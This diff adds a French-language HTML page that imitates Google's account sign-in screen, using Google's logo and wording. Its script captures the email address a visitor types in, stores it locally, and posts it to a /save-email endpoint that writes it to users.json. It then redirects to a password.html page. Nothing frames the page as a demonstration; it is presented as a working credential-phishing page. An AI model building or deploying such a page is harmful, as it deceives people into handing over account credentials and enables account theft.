@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8" />
+  <title>Connexion - comptes Google</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="main">
+    <div class="card">
+      <div class="card-header" align="center">
+        <img src="https://www.google.fr/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" width="70" alt="logo">
+        <div class="login-title">Connexion</div>
+        <div class="login-subtitle">Utiliser votre compte Google</div>
+        <input type="text" id="email" placeholder="Adresse e-mail ou numéro de téléphone">
+      </div>
+
+      <div class="card-footer">
+        <a href="#">Adresse e-mail oubliée ?</a>
+        <p class="security-text">S'il ne s'agit pas de votre ordinateur, utilisez le mode Invité pour vous connecter en mode privé. <a href="#">En savoir plus</a></p>
+
+        <div class="card-footer-buttons">
+          <a href="#" class="link-create">Créer un compte</a>
+          <button id="nextBtn">Suivant</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<script>
+document.getElementById("nextBtn").addEventListener("click", async function () {
+  const emailInput = document.getElementById("email").value.trim();
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+  if (!emailRegex.test(emailInput)) {
+    alert("Veuillez entrer une adresse e-mail valide.");
+    return;
+  }
+
+  // Sauvegarde locale (localStorage)
+  localStorage.setItem("userEmail", emailInput);
+
+  // Envoi au serveur pour écriture dans users.json (endpoint /save-email)
+  try {
+    const resp = await fetch("/save-email", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email: emailInput })
+    });
+    const j = await resp.json();
+    if (!j.ok) {
+      console.warn("Enregistrement serveur échoué", j);
+      // on continue quand même vers la page suivante
+    }
+  } catch (err) {
+    console.warn("Erreur réseau lors de l'enregistrement de l'email", err);
+    // on continue quand même
+  }
+
+  // Redirige vers la page mot de passe
+  window.location.href = "password.html";
+});
+</script>
+</body>
+</html>
